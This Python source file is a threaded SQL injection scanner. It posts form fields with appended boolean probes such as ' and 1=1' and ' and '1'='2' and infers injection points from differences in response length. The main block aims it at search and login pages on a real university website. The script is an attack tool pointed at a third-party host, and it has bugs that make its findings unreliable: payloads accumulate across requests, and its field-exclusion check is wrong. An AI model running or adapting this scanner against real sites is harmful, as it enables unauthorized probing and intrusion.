'''
Created on 2012-8-8

@author: zsy
'''
import threading
from urllib.parse import urlencode
from urllib.request import Request
from urllib.request import urlopen
class forminject(threading.Thread):
    def __init__(self,formdict):
        threading.Thread.__init__(self)
        self.formdict=formdict
        self.url=list(formdict)[0]
        self.inputlist=formdict[self.url]
    def formrequest(self,dict):
        data=urlencode(dict)
        data=data.encode(encoding='utf_8', errors='strict')
        r=Request(self.url,data)
        resp=urlopen(r)
        code=resp.getcode()
        urlresp=resp.geturl()
        headresp=resp.info()
        pageresp=resp.read()
        resp.close()
        return code,urlresp,headresp,pageresp
    def getdatadict(self):
        datadict={}
        for inputdict in self.inputlist:
            if "name" in inputdict and inputdict["name"]!=("submit" or "login" or "action" or "verifycode"):
                if "value" in inputdict and inputdict["value"]:
                    datadict[inputdict["name"]]=inputdict["value"]
                else:
                    datadict[inputdict["name"]]=""
        return datadict
    def Injectiontypedetect(self):
        datadict=self.getdatadict()
        code,urlresp,headresp,pageresp=self.formrequest(datadict)
        i=0
        for item in datadict:
            datadict[item]+=" and 1=1"
            code1,urlresp1,headresp1,pageresp1=self.formrequest(datadict)
            datadict[item]+=" and 1=2"
            code2,urlresp2,headresp2,pageresp2=self.formrequest(datadict)
            datadict[item]+="' and '1'='1"
            code3,urlresp3,headresp3,pageresp3=self.formrequest(datadict)
            datadict[item]+="' and '1'='2"
            code4,urlresp4,headresp4,pageresp4=self.formrequest(datadict)
            if len(pageresp)==len(pageresp1) and len(pageresp)!=len(pageresp2):
                print("numeric injection point:",item)
                i+=1
            elif len(pageresp)==len(pageresp3) and len(pageresp)!=len(pageresp4):
                print("char injection point:",item)
                i+=1
        print("%d injection points detected!"%i)
    
    def run(self):
        self.Injectiontypedetect()
if __name__=="__main__":
#    formdict={"http://fist.xjtu.edu.cn/Login.asp":[{"name":"UserName"},{"name":"password"},{"name":"lgchk","id":"lgchk"},{"value":"" ,"name":"chknm" }]}
    formdict={"http://fist.xjtu.edu.cn//search.php":[{"name":"keywords"}]}
    forminjectth=forminject(formdict)    
    forminjectth.start()
    
    
    